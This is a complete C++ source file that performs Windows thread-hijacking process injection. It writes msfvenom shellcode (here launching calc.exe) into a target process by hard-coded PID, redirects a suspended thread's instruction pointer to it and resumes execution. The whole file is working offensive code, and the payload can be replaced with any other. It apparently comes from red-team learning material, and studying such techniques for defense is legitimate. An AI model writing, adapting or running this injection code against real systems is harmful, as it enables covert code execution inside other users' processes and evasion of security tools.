/*
* Title: Thread Hijacking
* Resources:
*	- https://www.ired.team/offensive-security/code-injection-process-injection/injecting-to-remote-process-via-thread-hijacking
*/
#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>

VOID Cleanup(HANDLE hProcess, LPVOID lpRemoteBuffer, HANDLE hSnapshot, HANDLE hThread) {
	if (lpRemoteBuffer)
		VirtualFreeEx(hProcess, lpRemoteBuffer, 0, MEM_RELEASE);
	if (hProcess)
		CloseHandle(hProcess);
	if (hSnapshot)
		CloseHandle(hSnapshot);
	if (hThread)
		CloseHandle(hThread);
}

BOOL ThreadHijacking() {
	DWORD dwPid = 1288; // Replace it with the target PID.

	// The shellcode generated by `msfvenom -p windows/x64/exec CMD=calc.exe -f c`
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	// Open the target process handle and write shellcode to the allocated memory.
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess) {
		return FALSE;
	}
	LPVOID lpRemoteBuffer = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpRemoteBuffer) {
		Cleanup(hProcess, lpRemoteBuffer, nullptr, nullptr);
		return FALSE;
	}
	if (!WriteProcessMemory(hProcess, lpRemoteBuffer, shellcode, sizeof(shellcode), nullptr)) {
		Cleanup(hProcess, lpRemoteBuffer, nullptr, nullptr);
		return FALSE;
	}

	// Find the target thread and open its handle.
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (!hSnapshot) {
		Cleanup(hProcess, lpRemoteBuffer, nullptr, nullptr);
		return FALSE;
	}
	THREADENTRY32 threadEntry = {};
	threadEntry.dwSize = sizeof(THREADENTRY32);
	if (!Thread32First(hSnapshot, &threadEntry)) {
		Cleanup(hProcess, lpRemoteBuffer, hSnapshot, nullptr);
		return FALSE;
	}
	HANDLE hThread = nullptr;
	while (Thread32Next(hSnapshot, &threadEntry)) {
		if (threadEntry.th32OwnerProcessID == dwPid) {
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
			break;
		}
	}
	if (!hThread) {
		Cleanup(hProcess, lpRemoteBuffer, hSnapshot, hThread);
		return FALSE;
	}

	// Suspend the thread temporarily for setting our remote address to the shellcode as below.
	if (SuspendThread(hThread) == -1) {
		Cleanup(hProcess, lpRemoteBuffer, hSnapshot, hThread);
		return FALSE;
	}

	// Set thread context for executing our shellcode
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(hThread, &ctx)) {
		Cleanup(hProcess, lpRemoteBuffer, hSnapshot, hThread);
		return FALSE;
	}
	ctx.Rip = (DWORD_PTR)lpRemoteBuffer;
	if (!SetThreadContext(hThread, &ctx)) {
		Cleanup(hProcess, lpRemoteBuffer, hSnapshot, hThread);
		return FALSE;
	}

	// Now resume the thread and execute our shellcode.
	if (ResumeThread(hThread) == -1) {
		Cleanup(hProcess, lpRemoteBuffer, hSnapshot, hThread);
		return FALSE;
	}

	WaitForSingleObject(hThread, INFINITE);

	Cleanup(hProcess, lpRemoteBuffer, hSnapshot, hThread);
	return TRUE;
}
